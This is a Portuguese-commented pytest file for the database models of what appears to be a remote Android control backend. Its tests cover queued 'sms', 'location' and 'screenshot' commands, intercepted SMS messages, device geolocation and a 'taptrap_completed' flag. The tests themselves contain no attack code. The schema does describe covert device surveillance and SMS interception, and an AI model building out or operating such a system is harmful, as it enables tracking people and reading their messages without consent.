"""
Testes unitários para models do banco de dados
"""

import pytest
from datetime import datetime, timedelta
from database.backend.models import User, Device, Command, SmsMessage

class TestUserModel:
    """Testes do modelo User"""
    
    def test_create_user(self, db_session):
        """Deve criar usuário com dados válidos"""
        user = User(
            username='testuser',
            email='test@example.com',
            role='operator'
        )
        user.set_password('secure_password_123')
        
        db_session.add(user)
        db_session.commit()
        
        assert user.id is not None
        assert user.username == 'testuser'
        assert user.role == 'operator'
        assert user.active is True
    
    def test_password_hashing(self, db_session):
        """Deve fazer hash da senha corretamente"""
        user = User(username='test', email='test@test.com')
        password = 'my_secure_password'
        user.set_password(password)
        
        # Senha não deve ser armazenada em plain text
        assert user.password_hash != password
        
        # Deve verificar senha corretamente
        assert user.check_password(password) is True
        assert user.check_password('wrong_password') is False
    
    def test_user_to_dict(self, db_session):
        """Deve converter usuário para dict"""
        user = User(
            username='testuser',
            email='test@example.com',
            role='admin'
        )
        user.set_password('password')
        db_session.add(user)
        db_session.commit()
        
        user_dict = user.to_dict()
        
        assert user_dict['username'] == 'testuser'
        assert user_dict['email'] == 'test@example.com'
        assert user_dict['role'] == 'admin'
        assert 'password_hash' not in user_dict  # Não deve expor senha
    
    def test_unique_username(self, db_session):
        """Username deve ser único"""
        user1 = User(username='unique', email='user1@test.com')
        user1.set_password('pass')
        db_session.add(user1)
        db_session.commit()
        
        # Tentar criar outro com mesmo username
        user2 = User(username='unique', email='user2@test.com')
        user2.set_password('pass')
        db_session.add(user2)
        
        with pytest.raises(Exception):  # Integrity error
            db_session.commit()


class TestDeviceModel:
    """Testes do modelo Device"""
    
    def test_create_device(self, db_session):
        """Deve criar dispositivo com dados válidos"""
        device = Device(
            device_id='device_001',
            device_name='Samsung Galaxy',
            model='SM-G991B',
            manufacturer='Samsung',
            android_version='13',
            api_level=33,
            status='online'
        )
        
        db_session.add(device)
        db_session.commit()
        
        assert device.id is not None
        assert device.device_id == 'device_001'
        assert device.status == 'online'
    
    def test_device_defaults(self, db_session):
        """Deve aplicar valores padrão"""
        device = Device(device_id='test_001')
        db_session.add(device)
        db_session.commit()
        
        assert device.status == 'offline'  # Default
        assert device.is_charging is False  # Default
        assert device.taptrap_completed is False  # Default
        assert device.first_seen is not None
        assert device.last_seen is not None
    
    def test_device_to_dict(self, db_session):
        """Deve converter device para dict"""
        device = Device(
            device_id='test_001',
            model='Test Model',
            battery_level=85.5,
            latitude=-23.550520,
            longitude=-46.633308
        )
        db_session.add(device)
        db_session.commit()
        
        device_dict = device.to_dict()
        
        assert device_dict['device_id'] == 'test_001'
        assert device_dict['battery_level'] == 85.5
        assert device_dict['latitude'] == -23.550520
        assert 'last_seen' in device_dict
    
    def test_unique_device_id(self, db_session):
        """Device ID deve ser único"""
        device1 = Device(device_id='unique_001')
        db_session.add(device1)
        db_session.commit()
        
        device2 = Device(device_id='unique_001')
        db_session.add(device2)
        
        with pytest.raises(Exception):
            db_session.commit()
    
    def test_device_relationships(self, db_session):
        """Deve manter relacionamentos corretos"""
        device = Device(device_id='test_001')
        db_session.add(device)
        db_session.commit()
        
        # Adicionar comando
        command = Command(
            device_id=device.id,
            command_type='location',
            status='pending'
        )
        db_session.add(command)
        db_session.commit()
        
        # Deve acessar comandos via relacionamento
        assert len(device.commands) == 1
        assert device.commands[0].command_type == 'location'


class TestCommandModel:
    """Testes do modelo Command"""
    
    def test_create_command(self, db_session, sample_device):
        """Deve criar comando com dados válidos"""
        command = Command(
            device_id=sample_device.id,
            command_type='sms',
            command_data={'number': '+5511999999999', 'message': 'Test'},
            priority='normal',
            status='pending'
        )
        
        db_session.add(command)
        db_session.commit()
        
        assert command.id is not None
        assert command.command_id is not None  # UUID gerado automaticamente
        assert command.command_type == 'sms'
        assert command.status == 'pending'
    
    def test_command_defaults(self, db_session, sample_device):
        """Deve aplicar valores padrão"""
        command = Command(
            device_id=sample_device.id,
            command_type='location'
        )
        db_session.add(command)
        db_session.commit()
        
        assert command.status == 'pending'  # Default
        assert command.priority == 'normal'  # Default
        assert command.retries == 0  # Default
        assert command.max_retries == 3  # Default
        assert command.created_at is not None
    
    def test_command_to_dict(self, db_session, sample_device):
        """Deve converter command para dict"""
        command = Command(
            device_id=sample_device.id,
            command_type='screenshot',
            command_data={'quality': 'high'},
            priority='high'
        )
        db_session.add(command)
        db_session.commit()
        
        cmd_dict = command.to_dict()
        
        assert cmd_dict['command_type'] == 'screenshot'
        assert cmd_dict['priority'] == 'high'
        assert cmd_dict['status'] == 'pending'
        assert 'created_at' in cmd_dict
    
    def test_command_uuid_unique(self, db_session, sample_device):
        """Command ID (UUID) deve ser único"""
        cmd1 = Command(device_id=sample_device.id, command_type='test1')
        cmd2 = Command(device_id=sample_device.id, command_type='test2')
        
        db_session.add(cmd1)
        db_session.add(cmd2)
        db_session.commit()
        
        assert cmd1.command_id != cmd2.command_id


class TestSmsMessageModel:
    """Testes do modelo SmsMessage"""
    
    def test_create_sms_message(self, db_session, sample_device):
        """Deve criar mensagem SMS"""
        sms = SmsMessage(
            device_id=sample_device.id,
            message_type='received',
            phone_number='+5511999999999',
            message_body='Test message',
            sms_timestamp=datetime.utcnow()
        )
        
        db_session.add(sms)
        db_session.commit()
        
        assert sms.id is not None
        assert sms.message_type == 'received'
        assert sms.phone_number == '+5511999999999'
    
    def test_sms_defaults(self, db_session, sample_device):
        """Deve aplicar valores padrão"""
        sms = SmsMessage(
            device_id=sample_device.id,
            message_type='sent',
            phone_number='+5511988888888',
            message_body='Test',
            sms_timestamp=datetime.utcnow()
        )
        db_session.add(sms)
        db_session.commit()
        
        assert sms.is_read is False  # Default
        assert sms.is_processed is False  # Default
        assert sms.is_command is False  # Default
        assert sms.intercepted_at is not None
    
    def test_sms_to_dict(self, db_session, sample_device):
        """Deve converter SMS para dict"""
        sms = SmsMessage(
            device_id=sample_device.id,
            message_type='received',
            phone_number='+5511999999999',
            message_body='Test message',
            sms_timestamp=datetime.utcnow()
        )
        db_session.add(sms)
        db_session.commit()
        
        sms_dict = sms.to_dict()
        
        assert sms_dict['message_type'] == 'received'
        assert sms_dict['phone_number'] == '+5511999999999'
        assert sms_dict['message_body'] == 'Test message'
        assert 'intercepted_at' in sms_dict


class TestModelRelationships:
    """Testes de relacionamentos entre models"""
    
    def test_device_commands_relationship(self, db_session):
        """Deve manter relacionamento Device-Commands"""
        device = Device(device_id='test_001')
        db_session.add(device)
        db_session.commit()
        
        # Adicionar múltiplos comandos
        for i in range(3):
            cmd = Command(
                device_id=device.id,
                command_type=f'test_{i}'
            )
            db_session.add(cmd)
        db_session.commit()
        
        # Verificar relacionamento
        assert len(device.commands) == 3
        assert all(cmd.device_id == device.id for cmd in device.commands)
    
    def test_cascade_delete_device_commands(self, db_session):
        """Deve deletar comandos ao deletar device (cascade)"""
        device = Device(device_id='test_001')
        db_session.add(device)
        db_session.commit()
        
        cmd = Command(device_id=device.id, command_type='test')
        db_session.add(cmd)
        db_session.commit()
        
        # Deletar device
        db_session.delete(device)
        db_session.commit()
        
        # Comando deve ter sido deletado também
        assert Command.query.filter_by(device_id=device.id).count() == 0
    
    def test_device_sms_relationship(self, db_session):
        """Deve manter relacionamento Device-SMS"""
        device = Device(device_id='test_001')
        db_session.add(device)
        db_session.commit()
        
        # Adicionar SMS
        sms = SmsMessage(
            device_id=device.id,
            message_type='received',
            phone_number='+5511999999999',
            message_body='Test',
            sms_timestamp=datetime.utcnow()
        )
        db_session.add(sms)
        db_session.commit()
        
        # Verificar relacionamento
        assert len(device.sms_messages) == 1
        assert device.sms_messages[0].message_body == 'Test'

